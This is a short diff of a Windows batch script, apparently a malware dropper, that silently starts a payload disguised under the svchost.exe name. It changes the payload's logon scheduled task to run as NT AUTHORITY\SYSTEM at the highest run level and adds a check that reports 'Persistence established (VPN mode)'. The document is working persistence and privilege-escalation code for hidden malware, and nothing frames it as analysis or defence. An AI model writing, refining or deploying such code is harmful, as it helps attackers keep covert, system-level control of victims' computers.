@@ -55,12 +55,20 @@ if exist "%PAYLOAD%" (
     taskkill /f /im "svchost.exe" /fi "Path eq %PAYLOAD%" >nul 2>&1
     start "" "%PAYLOAD%" >nul 2>&1
     
-    :: FIXED: PowerShell task creation (bypasses schtasks issues completely)
+    :: FIXED FOR VPN: Use SYSTEM account (more reliable over remote connections)
     powershell -Command ^
         "$action = New-ScheduledTaskAction -Execute '%PAYLOAD%'; " ^
         "$trigger = New-ScheduledTaskTrigger -AtLogOn; " ^
-        "$principal = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem).UserName -LogonType Interactive -RunLevel Highest; " ^
+        "$principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; " ^
         "Register-ScheduledTask -TaskName '%TASK_NAME%' -Action $action -Trigger $trigger -Principal $principal -Force" >nul 2>&1
+    
+    :: Verify task was created
+    schtasks /query /tn "%TASK_NAME%" >nul 2>&1
+    if %errorlevel% equ 0 (
+        echo   [*] Persistence established (VPN mode)
+    ) else (
+        echo   [*] Warning: Task creation may have failed
+    )
 )
 
 echo.
